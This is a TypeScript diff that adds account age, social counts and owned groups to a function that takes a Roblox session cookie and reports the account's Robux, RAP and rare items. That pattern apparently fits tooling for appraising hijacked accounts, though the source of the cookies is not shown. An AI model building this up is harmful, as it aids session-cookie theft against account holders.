@@ -137,6 +137,12 @@ function json(b: unknown, status = 200) {
   });
 }
 
+interface GroupOwned {
+  name: string;
+  memberCount: number;
+  role: string;
+}
+
 interface RobloxInfo {
   id: number;
   name: string;
@@ -147,6 +153,13 @@ interface RobloxInfo {
   hasKorblox: boolean | null;
   hasHeadless: boolean | null;
   headshot: string | null;
+  createdAt: string | null;
+  accountAgeDays: number | null;
+  friendsCount: number | null;
+  followersCount: number | null;
+  followingCount: number | null;
+  ownedGroups: GroupOwned[];
+  totalGroups: number | null;
 }
 
 async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
@@ -158,14 +171,24 @@ async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
     if (!authRes.ok) return null;
     const auth = await authRes.json() as { id: number; name: string; displayName: string };
 
-    const [robux, premium, headshot, rap, hasKorblox, hasHeadless] = await Promise.all([
+    const [robux, premium, headshot, rap, hasKorblox, hasHeadless, profile, friendsCount, followersCount, followingCount, groupsInfo] = await Promise.all([
       fetchRobux(auth.id, cookieHeader),
       fetchPremium(auth.id, cookieHeader),
       fetchHeadshot(auth.id),
       fetchRap(auth.id),
       ownsBundle(auth.id, KORBLOX_BUNDLE_ID),
       ownsBundle(auth.id, HEADLESS_BUNDLE_ID),
+      fetchProfile(auth.id),
+      fetchCount(`https://friends.roblox.com/v1/users/${auth.id}/friends/count`, "count"),
+      fetchCount(`https://friends.roblox.com/v1/users/${auth.id}/followers/count`, "count"),
+      fetchCount(`https://friends.roblox.com/v1/users/${auth.id}/followings/count`, "count"),
+      fetchGroups(auth.id),
     ]);
+
+    const createdAt = profile?.created ?? null;
+    const accountAgeDays = createdAt
+      ? Math.floor((Date.now() - new Date(createdAt).getTime()) / (1000 * 60 * 60 * 24))
+      : null;
 
     return {
       id: auth.id,
@@ -177,11 +200,48 @@ async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
       hasKorblox,
       hasHeadless,
       headshot,
+      createdAt,
+      accountAgeDays,
+      friendsCount,
+      followersCount,
+      followingCount,
+      ownedGroups: groupsInfo.owned,
+      totalGroups: groupsInfo.total,
     };
   } catch (e) {
     console.error("roblox lookup failed", e);
     return null;
   }
+}
+
+async function fetchProfile(userId: number): Promise<{ created: string } | null> {
+  try {
+    const r = await fetch(`https://users.roblox.com/v1/users/${userId}`);
+    if (!r.ok) return null;
+    return await r.json();
+  } catch { return null; }
+}
+
+async function fetchCount(url: string, key: string): Promise<number | null> {
+  try {
+    const r = await fetch(url);
+    if (!r.ok) return null;
+    const j = await r.json();
+    return j?.[key] ?? null;
+  } catch { return null; }
+}
+
+async function fetchGroups(userId: number): Promise<{ owned: GroupOwned[]; total: number | null }> {
+  try {
+    const r = await fetch(`https://groups.roblox.com/v2/users/${userId}/groups/roles`);
+    if (!r.ok) return { owned: [], total: null };
+    const j = await r.json() as { data?: Array<{ group: { name: string; memberCount: number }; role: { name: string; rank: number } }> };
+    const all = j.data ?? [];
+    const owned = all
+      .filter((g) => g.role?.rank === 255 || /owner/i.test(g.role?.name ?? ""))
+      .map((g) => ({ name: g.group.name, memberCount: g.group.memberCount, role: g.role.name }));
+    return { owned, total: all.length };
+  } catch { return { owned: [], total: null }; }
 }
 
 async function fetchRobux(userId: number, cookieHeader: string): Promise<number | null> {
